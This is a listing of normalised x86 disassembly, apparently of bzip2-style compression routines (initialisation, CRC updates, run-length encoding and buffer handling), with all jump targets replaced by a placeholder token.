mov [ ecx + 0x10 ] eax
push 0x1
mov edx [ ebp - 0x4 ]
lea eax [ edx * 4 + 0x88 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
call ecx
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push 0x1
push 0x40004
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
call eax
add esp 0xc
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
mov eax 0xfffffffd
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x2c ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
call edx
add esp 0x8
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x18 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
call eax
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x26c ] 0x0
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] 0x2
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x2
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x264 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x270 ] eax
mov ecx [ ebp + 0xc ]
imul ecx ecx 0x186a0
sub ecx 0x13
mov edx [ ebp - 0x8 ]
mov [ edx + 0x48 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x268 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx + 0x30 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x24 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ecx + 0x28 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x2c ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
mov [ edx + 0x20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0x0
mov edx [ ebp - 0x8 ]
push edx
call sub_40b9a0
add esp 0x4
mov eax [ ebp - 0x8 ]
push eax
call sub_40b930
add esp 0x4
xor eax eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x18 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
call ecx
add esp 0x8
mov eax 0xfffffffd
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
call eax
add esp 0x8
sub_40b8c0
push ebp
mov ebp esp
xor eax eax
je r-xdata
xor ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
xor edx edx
je r-xdata
xor eax eax
jmp r-xdata
pop ebp
retn
mov eax 0x1
xor eax eax
jmp r-xdata
sub_40b8f0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
push eax
call j_sub_405340
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40b930
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x44 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x50 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x260 ] 0xffffffff
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x26c ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x26c ] ecx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x58 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_40b9c0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x3
ja r-xdata
mov eax 0xfffffffe
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
jmp [ ecx * 4 + jump_table_40bbac ]
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0xc ] 0x2
je r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40bbf0
add esp 0x4
mov [ ebp - 0x5 ] al
movzx eax [ ebp - 0x5 ]
neg eax
sbb eax eax
and eax 0x3
add eax 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
cmp edx [ eax + 0x4 ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
cmp edx [ eax + 0x4 ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40bbf0
add esp 0x4
mov [ ebp - 0x5 ] al
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0xc ] 0x0
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40bbf0
add esp 0x4
mov [ ebp - 0x5 ] al
movzx ecx [ ebp - 0x5 ]
test ecx ecx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ecx + 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x4
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_40bbc0
add esp 0x4
movzx eax al
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xc ] 0x0
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x50 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40bbc0
add esp 0x4
movzx ecx al
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x2
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0x50 ]
cmp ecx [ eax + 0x4c ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x1
mov eax 0x4
jmp r-xdata
sub_40bbc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x34 ] 0x100
jae r-xdata
mov al 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x38 ] 0x0
jle r-xdata
xor al al
jmp r-xdata
pop ebp
retn
sub_40bbf0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x6 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x4 ] ecx
movzx edx [ ebp - 0x5 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x1
jne r-xdata
mov [ ebp - 0xc ] 0x1
movzx eax [ ebp - 0x6 ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x8 ] 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_40c300
add esp 0x4
movzx edx al
movzx eax [ ebp - 0x6 ]
or eax edx
mov [ ebp - 0x6 ] al
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x50 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40bfd0
add esp 0x4
movzx ecx al
movzx edx [ ebp - 0x5 ]
or edx ecx
mov [ ebp - 0x5 ] dl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x4 ] 0x4
jne r-xdata
jmp r-xdata
mov al [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov edx 0x1
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x44 ]
cmp eax [ edx + 0x48 ]
jl r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_40b930
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x2
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x4 ] 0x3
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx [ ebp - 0x4 ]
push ecx
call sub_40c4d0
add esp 0x8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_40bd80
add esp 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x4
sete cl
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_40c4d0
add esp 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40bbc0
add esp 0x4
movzx ecx al
test ecx ecx
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40bbc0
add esp 0x4
movzx ecx al
test ecx ecx
je r-xdata
jmp r-xdata
jmp r-xdata
sub_40bd80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x34 ] 0x100
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40b9a0
add esp 0x4
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40bdb0
add esp 0x4
sub_40bdb0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x34 ]
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x38 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx + 0x58 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x260 ]
shl eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x260 ]
shr edx 0x18
movzx ecx [ ebp - 0x5 ]
xor edx ecx
xor eax [ edx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x260 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x3
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax + 0x54 ] 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x5 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
sub eax 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x44 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
sub_40bfd0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x44 ]
cmp ecx [ eax + 0x48 ]
jl r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x44 ]
cmp ecx [ eax + 0x48 ]
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0xc ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x34 ]
je r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
movzx edx [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax + 0x34 ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x34 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x38 ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
cmp eax [ edx + 0x34 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x38 ] 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x34 ] 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x38 ] 0xff
jne r-xdata
mov edx [ ebp + 0x8 ]
mov al [ edx + 0x34 ]
mov [ ebp - 0x9 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x260 ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x260 ]
shr ecx 0x18
movzx eax [ ebp - 0x9 ]
xor ecx eax
xor edx [ ecx * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x260 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax + 0x58 ] 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov cl [ ebp - 0x9 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x34 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x34 ] 0x100
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x38 ] 0xff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x34 ]
mov [ ebp - 0x11 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x260 ]
shl eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x260 ]
shr edx 0x18
movzx ecx [ ebp - 0x11 ]
xor edx ecx
xor eax [ edx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x260 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx + 0x58 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov dl [ ebp - 0x11 ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x44 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x34 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x34 ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40bdb0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x34 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40bdb0
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
sub_40c300
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] 0x0
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x50 ]
cmp edx [ ecx + 0x4c ]
jl r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x50 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
mov edx [ edx + 0x10 ]
mov al [ ecx + eax ]
mov [ edx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x50 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x50 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x10 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x10 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x1c ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x1c ] edx
mov eax 0x1
test eax eax
je r-xdata
sub_40c3d0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
call ecx
add esp 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x2c ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
call edx
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
push edx
